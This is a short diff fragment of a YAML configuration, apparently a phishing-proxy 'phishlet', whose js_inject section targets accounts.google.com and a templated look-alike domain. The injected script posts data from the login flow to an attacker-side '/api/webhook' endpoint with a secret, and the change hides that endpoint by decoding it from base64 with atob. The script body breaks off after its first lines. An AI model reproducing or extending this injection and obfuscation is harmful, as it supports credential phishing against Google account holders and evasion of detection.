@@ -35,8 +35,8 @@ js_inject:
   - trigger_domains: ['{{.Endpoint3}}.{{.Domain}}', 'accounts.google.com']
     trigger_paths: ['/.*']
     script: |
-      (function(){
-        const api = "https://{{.Domain}}/api/webhook";
+      (function() {
+        const api = atob('{{.DomainBase64}}') + "/api/webhook";
         const secret = "{{.WebhookSecret}}";
         const source = "google";
         let step = 1;
